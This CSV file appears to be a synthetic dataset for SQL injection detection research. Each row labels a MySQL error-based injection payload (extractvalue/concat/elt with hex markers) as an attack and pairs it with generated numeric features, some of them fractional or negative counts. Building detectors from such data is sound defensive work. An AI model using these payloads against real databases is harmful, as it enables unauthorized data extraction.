id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000173,attack,error,"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""mhfc""  =  ""mhfc",nearest_attack_euclidean,R000212,3.939048930198484,171.4033660888672,44.98464584350586,34.42378234863281,66.23577880859375,0.1455295830965042,50.801414489746094,24.049715042114258,1.066988468170166,0.250548779964447,0.21597029268741608,0.39097860455513,0.1289316713809967,3.6718809604644775,0.9490134716033936,1.3617963790893555,0.5269218683242798,0.16703768074512482,0.015360726974904537,0.0675160363316536,5.9639129638671875,6.464847087860107,4.638984203338623,0.04575493559241295,1.377817153930664,0.1159723699092865,-0.15164145827293396,0.019836144521832466,0.025729600340127945,0.20628270506858826,0.02668016031384468,0.0017798840999603271,2.764617681503296,0.14203663170337677,0.4146386682987213,1.5001776218414307,4.504631996154785,0.7268006205558777,1.1337960958480835,0.07323204725980759,0.27293661236763,0.2409697324037552,-0.1652108132839203,0.2195120006799698,0.16521736979484558,-0.04607715457677841,-0.15075483918190002,0.031302373856306076,0.03411058709025383,0.057459089905023575,-0.08197014033794403,-0.00956927053630352,-0.1330091953277588,0.20459812879562378,-0.09615636616945267,-0.15632794797420502,0.06265171617269516,0.15992462635040283,0.10225643217563629,0.058482326567173004,0.07463985681533813,0.049186140298843384,-0.09636638313531876,0.039645273238420486,0.07550089806318283,-0.14336994290351868,0.9890458583831787,0.23306339979171753,0.09727680683135986,-0.0039006248116493225,0.08450411260128021,-0.08158320188522339,0.031184708699584007,0.2557590901851654,0.02161463536322117,0.042587317526340485,1.2441272735595703,0.35246527194976807,-0.14529544115066528,0.0018955545965582132,0.14294618368148804,4.1282525062561035,0.64667809009552,0.26641735434532166,0.10785607248544693,0.8606889843940735,0.006848983466625214,0.11511804908514023,-0.19624164700508118
GAN_000174,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000222,3.909973270231784,170.7997589111328,46.143192291259766,34.656272888183594,65.8873519897461,0.20745398104190826,47.672359466552734,23.873340606689453,1.273133635520935,0.26203927397727966,0.21288064122200012,0.39108288288116455,0.12866973876953125,3.6740784645080566,0.9740810394287109,1.158969759941101,0.5275340676307678,0.16630347073078156,0.007136003114283085,0.06724677979946136,6.273758411407471,6.401881694793701,4.788250923156738,0.1459534913301468,1.376448154449463,0.1788184642791748,0.049528080970048904,0.14017733931541443,-0.01931532844901085,0.18004047870635986,-0.10392148792743683,0.003480352461338043,2.7544586658477783,0.14576245844364166,0.41506868600845337,1.5079604387283325,4.520412921905518,0.7141200304031372,1.2690693140029907,0.010505080223083496,0.3898085355758667,0.22072312235832214,-0.011331610381603241,0.1631471812725067,0.17649000883102417,-0.08033699542284012,-0.2813740074634552,0.026362011209130287,0.024426346644759178,0.053383536636829376,-0.07324276119470596,0.024185171350836754,-0.1816440224647522,0.20034313201904297,0.03826695680618286,-0.20673228800296783,0.14838653802871704,-0.031039660796523094,0.11623235046863556,0.07241182774305344,-0.02197936922311783,0.08922725170850754,-0.10995656996965408,0.04885059967637062,0.07514888793230057,0.09446439146995544,0.9953843951225281,0.09499529749155045,0.10091366618871689,-0.07298287749290466,0.05528903007507324,-0.20422716438770294,-0.02262091636657715,0.05993043631315231,0.01661003567278385,0.07580771297216415,1.0679740905761719,0.3425322473049164,-0.17292791604995728,0.01616489142179489,0.09246513247489929,4.187678813934326,0.6309362053871155,0.17434999346733093,0.10078228265047073,0.8821013569831848,-0.15951117873191833,0.1354348063468933,-0.05126956105232239
GAN_000175,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.250288518699868,168.2798309326172,44.46538543701172,34.725276947021484,67.06074523925781,-0.3658144474029541,50.166133880615234,24.758052825927734,1.280317783355713,0.24454478919506073,0.21668098866939545,0.3933975100517273,0.12917429208755493,3.649786949157715,1.018200397491455,1.4637404680252075,0.6244165301322937,0.20525118708610535,0.005649872124195099,0.15099650621414185,5.9770331382751465,6.452907085418701,4.694180488586426,0.08952590823173523,1.3167545795440674,0.08897697180509567,-0.17882969975471497,-0.02560575120151043,-0.04202556237578392,0.20110385119915009,-0.11425518989562988,0.0756305530667305,2.749606132507324,0.307636022567749,0.5267998576164246,1.4643582105636597,4.404823303222656,0.58164381980896,1.2001252174377441,0.04129312187433243,0.3089294135570526,0.23623870313167572,-0.27817660570144653,0.16686365008354187,0.21236595511436462,-0.07781899720430374,-0.26088598370552063,0.03076656349003315,0.029209313914179802,0.03037339076399803,-0.13174991309642792,-0.0031233332119882107,-0.20576605200767517,0.15491646528244019,-0.15312698483467102,-0.239377960562706,0.08636318147182465,0.1365801990032196,0.0852566659450531,-0.041561707854270935,0.049700215458869934,0.15650001168251038,-0.18689504265785217,0.10406960546970367,0.08880427479743958,-0.038661226630210876,1.016772747039795,0.14491918683052063,0.11885978281497955,-0.09312431514263153,0.06974150240421295,-0.2367955595254898,0.017346568405628204,0.3483906388282776,0.02162853255867958,0.11967569589614868,1.3118205070495605,0.2732444107532501,-0.2394443154335022,-0.02313583344221115,-0.06260857731103897,3.960414171218872,0.7077245712280273,0.2114582657814026,-0.0680699422955513,0.8635982871055603,0.0013694241642951965,0.21778351068496704,-0.3314342498779297
GAN_000176,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.1484741055197825,170.66107177734375,44.039058685302734,35.48575210571289,65.34061431884766,0.8355815410614014,50.048797607421875,23.82455825805664,1.2606991529464722,0.25392621755599976,0.21199579536914825,0.39662429690361023,0.12685349583625793,3.676011562347412,0.5223144888877869,1.5238779783248901,0.7045028805732727,0.21323689818382263,0.03354303538799286,0.0962732806801796,6.032392978668213,6.488358974456787,4.619081020355225,0.17597214877605438,1.3472816944122314,0.31829217076301575,0.00344869215041399,0.14985260367393494,0.13268443942070007,0.1875195950269699,-0.024600520730018616,-0.08839142322540283,2.9288558959960938,0.03314259648323059,0.3706734776496887,1.5688847303390503,4.552400588989258,0.8797489404678345,1.2168266773223877,-0.15754449367523193,0.3388524353504181,0.16953928768634796,0.1067536473274231,0.2322121560573578,0.13414821028709412,-0.3198024034500122,-0.13051022589206696,0.0724254697561264,0.08641057461500168,0.03800715506076813,-0.0386473573744297,-0.0545036755502224,-0.2816561460494995,0.25668492913246155,-0.16839849948883057,-0.008120402693748474,0.3264390230178833,0.28579941391944885,-0.31898191571235657,-0.08917656540870667,0.2042544186115265,-0.15451960265636444,-0.38315343856811523,0.12981852889060974,0.10761658102273941,-0.14298592507839203,0.9947314858436584,-0.09508345276117325,0.2166009098291397,0.08093973249197006,0.1199602335691452,-0.3291856050491333,-0.14952245354652405,0.09349606931209564,0.027705980464816093,0.13067469000816345,1.1763097047805786,0.2624150812625885,-0.030892543494701385,0.15537776052951813,-0.031475089490413666,4.117866039276123,0.4942149817943573,0.11509039252996445,0.06840283423662186,0.9295030832290649,0.02969598025083542,-0.2771877348423004,-0.14559653401374817
GAN_000177,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000239,3.6233998776718304,171.30303955078125,46.067779541015625,35.4736213684082,66.2887191772461,-0.023450421169400215,48.514892578125,23.133563995361328,1.0941569805145264,0.27005335688591003,0.21104899048805237,0.3837392032146454,0.1303357481956482,3.7117443084716797,1.294570803642273,0.7145854234695435,0.46631720662117004,0.14508827030658722,0.013869653455913067,0.2596825361251831,6.052754878997803,6.501859188079834,4.93376350402832,0.030721448361873627,1.3609014749526978,0.07479038089513779,-0.18741822242736816,0.2833094000816345,0.0667993575334549,0.17611010372638702,-0.00373685359954834,-0.26284605264663696,2.839167833328247,0.15177446603775024,0.34240224957466125,1.4597493410110474,4.619119167327881,0.8642414808273315,1.132214903831482,-0.06778741627931595,0.28873100876808167,0.1788896769285202,0.14792931079864502,0.22605878114700317,0.04600027948617935,0.12373636662960052,-0.09252801537513733,0.05248839035630226,0.03933108225464821,0.038070954382419586,-0.0005552447983063757,0.00587503844872117,-0.025363996624946594,-0.14209184050559998,-0.03770896792411804,-0.02168358862400055,0.07675477117300034,0.03444844111800194,-0.07717330753803253,0.14200305938720703,-0.06131206080317497,-0.048719968646764755,0.07033476233482361,0.11444416642189026,0.038413889706134796,-0.05094426870346069,0.9568228125572205,-0.042161136865615845,0.09797579050064087,0.014439709484577179,0.09593367576599121,-0.08383752405643463,0.015100143849849701,0.09421800822019577,0.00817153137177229,0.06729090958833694,1.030749797821045,0.34810349345207214,-0.06156768649816513,0.1313723474740982,0.09010554850101471,4.394425392150879,0.49953651428222656,0.24164196848869324,0.17770837247371674,0.8793597221374512,-0.18128934502601624,0.010361257940530777,-0.13325724005699158
GAN_000178,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.706441227137153,171.64065551757812,43.84003829956055,36.00141143798828,66.92151641845703,-0.35162389278411865,50.401206970214844,23.38680076599121,0.8415396809577942,0.2670414447784424,0.2047743797302246,0.3868440091609955,0.1281491219997406,3.722504138946533,1.2259910106658936,0.8659670352935791,0.49797412753105164,0.11719594150781631,0.03580076992511749,0.03851762041449547,6.21745491027832,6.5331950187683105,4.75403356552124,0.094969742000103,1.3231106996536255,0.2327686846256256,-0.09775669127702713,0.13248461484909058,0.10157906264066696,0.18591351807117462,-0.01154790073633194,-0.30072712898254395,2.78452467918396,-0.015753623098134995,0.35034337639808655,1.5287938117980957,4.645110130310059,1.1416800022125244,1.147864818572998,-0.18094384670257568,0.36862412095069885,0.15799365937709808,-0.013509511947631836,0.22649961709976196,0.10927964001893997,-0.005253300070762634,-0.016569487750530243,0.044084519147872925,0.07045555859804153,0.08181757479906082,0.0009816349484026432,0.011265791952610016,-0.0894683226943016,-0.048331815749406815,-0.13323761522769928,0.03352266550064087,0.06729781627655029,0.15700924396514893,-0.21456101536750793,0.3001525104045868,0.021347858011722565,0.14755219221115112,-0.09905999153852463,0.10245457291603088,0.0527472086250782,0.08422388136386871,0.9271193146705627,0.09156184643507004,0.020572327077388763,0.02127319574356079,-0.08405330032110214,-0.09436678141355515,0.18601110577583313,-0.0036110877990722656,0.007665189448744059,-0.08956679701805115,1.0183231830596924,0.27538466453552246,0.0037161409854888916,0.11030583828687668,-0.16215366125106812,4.22105598449707,0.6072741746902466,0.19667556881904602,0.1350226253271103,0.9102486371994019,0.03429637849330902,0.01354406401515007,0.13687363266944885
GAN_000179,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,4.049835821005247,170.23040771484375,44.22132873535156,35.62997817993164,66.39395904541016,-0.007374928332865238,49.42428970336914,23.474634170532227,0.8873546719551086,0.2570342719554901,0.21019841730594635,0.39088207483291626,0.1280709207057953,3.6938393115997314,1.0474973917007446,1.2905155420303345,0.5740119814872742,0.21080246567726135,0.061909809708595276,-0.11160743236541748,6.247703552246094,6.502859115600586,4.647924900054932,0.07755983620882034,1.3197122812271118,0.5331882238388062,-0.02383357286453247,0.03162156045436859,0.19341158866882324,0.26924997568130493,0.06203586980700493,-0.2955612540245056,2.779165029525757,0.05088655278086662,0.340433269739151,1.6496399641036987,4.653323650360107,0.889247715473175,1.1985621452331543,-0.3774486184120178,0.44263938069343567,0.17000523209571838,0.015811048448085785,0.22704841196537018,0.17279404401779175,-0.21369832754135132,0.006637558341026306,0.03350278362631798,0.08844593912363052,0.11112995445728302,-0.02081073634326458,-0.00669030612334609,0.02493443712592125,0.24175861477851868,-0.0914023146033287,0.17009171843528748,0.10792382806539536,0.12935206294059753,-0.17361697554588318,0.054833296686410904,0.12498728930950165,0.1276555359363556,-0.04762165993452072,0.06248118355870247,0.04442154988646507,-0.05860920995473862,0.9481772184371948,0.20380890369415283,0.13036443293094635,0.14474718272686005,-0.180594801902771,-0.1278638243675232,0.10630644857883453,0.10293755680322647,0.019553571939468384,-0.050577156245708466,1.1755492687225342,0.2611658275127411,-0.07017510384321213,0.061646439135074615,0.03644007071852684,4.306529998779297,0.632886528968811,0.14529940485954285,0.19578130543231964,0.916354775428772,0.14609789848327637,0.1538202166557312,0.18175365030765533
GAN_000180,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,4.09205002861603,167.85693359375,45.6601676940918,35.099727630615234,67.70755767822266,-0.5616422295570374,49.109519958496094,24.752851486206055,0.994144082069397,0.2434435486793518,0.21358977258205414,0.38437891006469727,0.1286536306142807,3.696917772293091,1.4840383529663086,1.1747252941131592,0.624092698097229,0.1822255402803421,0.027146324515342712,0.22072377800941467,6.298643589019775,6.480719566345215,5.027099609375,-0.020132526755332947,1.2162301540374756,0.1328810751438141,-0.16509102284908295,-0.034310147166252136,0.021103709936141968,0.27678462862968445,-0.12120942771434784,-0.25225815176963806,2.8288538455963135,0.3310048580169678,0.4539957046508789,1.4519730806350708,4.500790596008301,0.6058468818664551,1.1697947978973389,-0.21281138062477112,0.4531559348106384,0.24620898067951202,0.022944629192352295,0.17084002494812012,0.25051623582839966,-0.033081717789173126,-0.02472110092639923,0.0059611559845507145,0.082672119140625,0.10812883824110031,-0.10975418984889984,0.015103941783308983,0.22939619421958923,-0.049285516142845154,-0.2830132842063904,-0.23663558065891266,0.22462180256843567,0.02996041253209114,0.0059509724378585815,0.22628028690814972,-0.001731477677822113,0.195635586977005,0.024263933300971985,0.07474227249622345,0.032348714768886566,0.08038143813610077,0.9632258415222168,0.07353683561086655,0.17853760719299316,0.037604235112667084,-0.250986248254776,-0.18465279042720795,0.14738404750823975,0.23075997829437256,0.007833604700863361,-0.02597998082637787,1.318001627922058,0.21993955969810486,-0.37925177812576294,0.0027396606747061014,-0.011190921068191528,4.214151859283447,0.7740998864173889,0.25217634439468384,0.009770250879228115,0.9060618877410889,0.047896094620227814,0.35569438338279724,-0.011464379727840424
GAN_000181,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.000060001577662,172.1696319580078,43.8242301940918,33.926937103271484,66.23190307617188,-0.05312983691692352,49.58308029174805,24.4942626953125,1.0770103931427002,0.2527051568031311,0.20628699660301208,0.3939467966556549,0.1302989274263382,3.707862377166748,1.0691622495651245,1.7937675714492798,0.5761193633079529,0.14484760165214539,0.06357128918170929,0.0945013090968132,6.064385414123535,6.322294235229492,4.799088478088379,-0.002140358090400696,1.4471510648727417,0.21080881357192993,-0.03556770086288452,-0.031102372333407402,0.12141767889261246,0.30297043919563293,-0.04699839651584625,-0.17497263848781586,2.792184352874756,0.2192220240831375,0.3848514258861542,1.5065258741378784,4.436567306518555,0.5524522066116333,1.319960355758667,-0.15712369978427887,0.3466033935546875,0.2291477918624878,0.0028133168816566467,0.2669626772403717,0.0589485689997673,-0.0029393434524536133,-0.2593885660171509,0.0729203000664711,0.041333455592393875,0.05874960497021675,-0.06525659561157227,0.020393604412674904,-0.3199656903743744,0.07701558619737625,-0.1382112354040146,-0.07183338701725006,0.013069689273834229,0.09249350428581238,0.012801572680473328,-0.06769327819347382,0.10261863470077515,0.25054579973220825,-0.21595022082328796,-0.06303288787603378,0.041071679443120956,-0.3079345226287842,0.9674342274665833,0.27196750044822693,0.22750462591648102,0.12873025238513947,-0.023561686277389526,-0.11849562078714371,0.1901857852935791,0.3355751037597656,0.02774507738649845,0.04512013867497444,1.2219382524490356,0.1710197776556015,-0.15826159715652466,-0.009549282491207123,-0.02426263689994812,4.209550380706787,0.6268899440765381,0.12132304161787033,0.06761854141950607,0.9036427736282349,0.07499471306800842,0.3170754909515381,-0.19335231184959412
GAN_000182,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,3.98042750660904,172.19717407226562,44.630706787109375,34.141265869140625,66.54492950439453,0.6854563355445862,49.33854675292969,24.004220962524414,0.9698265194892883,0.2568330764770508,0.2097526341676712,0.390149861574173,0.13080283999443054,3.6614058017730713,0.7822061777114868,1.5335078239440918,0.5025890469551086,0.15184426307678223,0.0406629703938961,0.0802200436592102,5.967922210693359,6.479883670806885,4.715883255004883,0.13774599134922028,1.4125467538833618,0.1531495451927185,-0.027901392430067062,-0.003190024523064494,0.0019134023459628224,0.24625149369239807,-0.1350460648536682,0.0839829370379448,2.729220390319824,0.07732881605625153,0.4229409098625183,1.5689154863357544,4.554458141326904,0.7136025428771973,1.2892950773239136,-0.033259302377700806,0.2916197180747986,0.2993079125881195,-0.25616103410720825,0.19702334702014923,0.28107813000679016,-0.10620620101690292,-0.32172954082489014,0.03548072651028633,0.030769335106015205,0.047150254249572754,-0.10062998533248901,-0.00626402860507369,-0.26968201994895935,0.4673059582710266,0.005516625940799713,-0.34520912170410156,0.05124979093670845,0.07290495932102203,0.17091453075408936,-0.017099864780902863,0.24778956174850464,-0.09440511465072632,-0.30589476227760315,-0.06623831391334534,0.08628233522176743,-0.11901772767305374,0.9841554164886475,0.405862957239151,0.15970629453659058,0.0992545485496521,-0.032108135521411896,-0.09418819099664688,-0.024675384163856506,0.22404007613658905,0.02963823825120926,0.00032898783683776855,1.3139630556106567,0.2792893052101135,-0.12063264101743698,-0.03321724385023117,0.1879303753376007,4.33595085144043,0.6483749747276306,0.09699312597513199,0.09364830702543259,0.8380126357078552,-0.07358089089393616,0.23331689834594727,-0.2736191153526306
GAN_000183,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,3.94977153794154,170.82177734375,46.082275390625,33.97433090209961,66.35699462890625,0.32726335525512695,50.170658111572266,23.96201515197754,1.0440094470977783,0.2601390779018402,0.20320332050323486,0.3933408260345459,0.1283753514289856,3.682356595993042,0.9035853147506714,1.611573576927185,0.586595356464386,0.09118031710386276,0.027829594910144806,0.010363795794546604,6.096419811248779,6.353390216827393,4.685260772705078,0.1981942057609558,1.4304924011230469,0.1267850399017334,0.13675996661186218,0.061777934432029724,0.07720649987459183,0.2175246924161911,-0.06617282330989838,0.0019342601299285889,2.736276388168335,0.1779797524213791,0.38498687744140625,1.48518705368042,4.405638694763184,0.7218247652053833,1.2391573190689087,-0.018438264727592468,0.386588454246521,0.24832996726036072,-0.029244430363178253,0.25772932171821594,0.1979556381702423,-0.09797703474760056,-0.3031158447265625,0.06579691171646118,0.008450593799352646,0.059091757982969284,-0.04735305532813072,0.024209778755903244,-0.378274530172348,0.23112478852272034,0.016275854781270027,-0.1455163210630417,0.012129373848438263,0.015635978430509567,0.18151098489761353,0.06645528227090836,0.06931090354919434,0.24765649437904358,-0.1717635989189148,-0.08969423174858093,0.073560930788517,-0.09740228950977325,0.9694417715072632,0.21556293964385986,0.16244889795780182,-0.09418430924415588,0.0640193298459053,-0.1841437816619873,0.04702559486031532,0.1824275106191635,0.02116822451353073,0.024235084652900696,1.1220248937606812,0.23751387000083923,-0.01723790168762207,-0.02460484951734543,-0.12589633464813232,4.084964752197266,0.5996544361114502,0.09647028148174286,0.0419088676571846,0.8750096559524536,-0.04157811030745506,0.13199210166931152,-0.01669863611459732
GAN_000184,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000222,3.945801715305124,169.36875915527344,47.14610290527344,33.40924835205078,64.93778228759766,-0.0033168953377753496,48.223670959472656,23.985591888427734,1.3498685359954834,0.25735872983932495,0.21430057287216187,0.3922809958457947,0.1272808164358139,3.6556589603424072,0.9570348858833313,1.2098156213760376,0.5321080684661865,0.13024990260601044,0.00819648988544941,-0.041908249258995056,6.1547322273254395,6.429980754852295,4.609626293182373,0.06228397414088249,1.38588547706604,0.09938333928585052,-0.09083221107721329,0.055518925189971924,0.03918001800775528,0.1690828949213028,-0.05259519815444946,0.03584844619035721,2.89015531539917,0.3332955539226532,0.4808560907840729,1.414608120918274,4.445244789123535,0.9499308466911316,1.2740147113800049,0.01716681569814682,0.34088507294654846,0.14819225668907166,-0.014445088803768158,0.2601388096809387,0.024952247738838196,-0.25063446164131165,-0.1436084508895874,0.03997397422790527,0.032135121524333954,0.04615411534905434,-0.07238058745861053,-0.04065161570906639,-0.25703907012939453,0.13078993558883667,0.013911053538322449,-0.21149538457393646,0.08465775847434998,-0.22978349030017853,0.19064795970916748,0.21123231947422028,-0.09336195886135101,0.08722048252820969,0.08790859580039978,0.05577198043465614,0.09222414344549179,-0.03152436390519142,1.027317762374878,-0.0016368627548217773,0.12154185026884079,-0.11917617917060852,0.20851999521255493,-0.24342478811740875,0.12585660815238953,0.19959750771522522,0.02077910117805004,-0.04670196771621704,1.11996591091156,0.42223015427589417,-0.34210678935050964,0.00040709247696213424,0.06575644016265869,3.8239142894744873,0.6357059478759766,0.20003041625022888,0.10111121088266373,0.9002024531364441,-0.024890903383493423,-0.18251752853393555,0.024083346128463745
GAN_000185,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.946535757928871,172.0316619873047,45.04203796386719,35.21366500854492,66.61293029785156,-0.42628955841064453,48.522850036621094,23.513290405273438,1.0768036842346191,0.2596132159233093,0.21400384604930878,0.38977929949760437,0.12988482415676117,3.6877033710479736,1.1905087232589722,1.2910635471343994,0.6023103594779968,0.2092045694589615,0.043683867901563644,0.30952221155166626,6.044595241546631,6.412257194519043,4.867403507232666,-0.07199981063604355,1.3161869049072266,0.3321492373943329,-0.13011673092842102,0.08707867562770844,0.15453307330608368,0.26030781865119934,-0.035457611083984375,-0.3089590072631836,2.847795248031616,0.1889372020959854,0.3091854155063629,1.4794150590896606,4.543968200683594,0.8321718573570251,1.1778515577316284,-0.08507484942674637,0.2775188088417053,0.18550358712673187,0.08909468352794647,0.2730564475059509,0.05660706013441086,-0.17217808961868286,-0.06359182298183441,0.08498892188072205,0.04547370970249176,0.062099628150463104,-0.02727646939456463,-0.009411917999386787,-0.10946755856275558,0.032346487045288086,-0.1716020405292511,0.030896805226802826,0.15814942121505737,0.11625851690769196,-0.10704295337200165,0.046519141644239426,-0.03819127753376961,-0.06366781890392303,-0.09957317262887955,0.1944860965013504,0.04506839066743851,-0.16909454762935638,0.9479885101318359,0.19531962275505066,0.21309073269367218,0.18308070302009583,0.024878833442926407,-0.20089168846607208,0.014876816421747208,0.21457993984222412,0.02450435794889927,0.027853447943925858,1.136427640914917,0.2661476135253906,-0.20950457453727722,0.08561359345912933,0.09193779528141022,4.191393852233887,0.554185688495636,0.1535435914993286,0.11961715668439865,0.8984683156013489,-0.006280109286308289,0.0024714507162570953,-0.1719001978635788
GAN_000186,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.521856831591879,172.33001708984375,46.72508239746094,34.4775276184082,65.3096694946289,0.4432101547718048,49.251747131347656,24.512239456176758,1.4005277156829834,0.23945268988609314,0.20594899356365204,0.3934493660926819,0.12882864475250244,3.6494269371032715,1.0523837804794312,1.7583773136138916,0.8099173307418823,0.10910999774932861,0.019277989864349365,0.0857296735048294,6.209913730621338,6.2280659675598145,4.710770606994629,0.08076496422290802,1.281367301940918,0.12756456434726715,0.2355310022830963,0.0980072021484375,0.05761924386024475,0.19900186359882355,-0.09792864322662354,0.13999682664871216,2.7603209018707275,0.4679914712905884,0.3997913897037506,1.4621939659118652,4.290241718292236,0.4597730338573456,1.2191516160964966,-0.04625910893082619,0.44366255402565,0.29465579986572266,0.005011513829231262,0.15597431361675262,0.21783101558685303,-0.048691339790821075,-0.36462050676345825,0.09849327057600021,0.010790890082716942,0.050354138016700745,-0.08851483464241028,0.06993566453456879,-0.42306646704673767,0.3663398027420044,-0.06337492167949677,-0.22741712629795074,0.27793174982070923,0.21339133381843567,0.12451469898223877,-0.03372640907764435,0.003130771219730377,0.3706088364124298,-0.342090904712677,-0.04104460030794144,0.12359354645013809,-0.08253408223390579,1.0154403448104858,0.20438238978385925,0.2742839753627777,-0.2066172957420349,-0.0042071714997291565,-0.456020712852478,-0.18526068329811096,0.06803752481937408,0.029670579358935356,0.234900563955307,1.0656205415725708,0.0863351970911026,-0.0846111848950386,-0.11103051155805588,-0.10435856133699417,3.8323886394500732,0.6660012602806091,0.19185234606266022,-0.12750084698200226,0.9426265954971313,-0.026697548106312752,0.17363306879997253,-0.24174603819847107
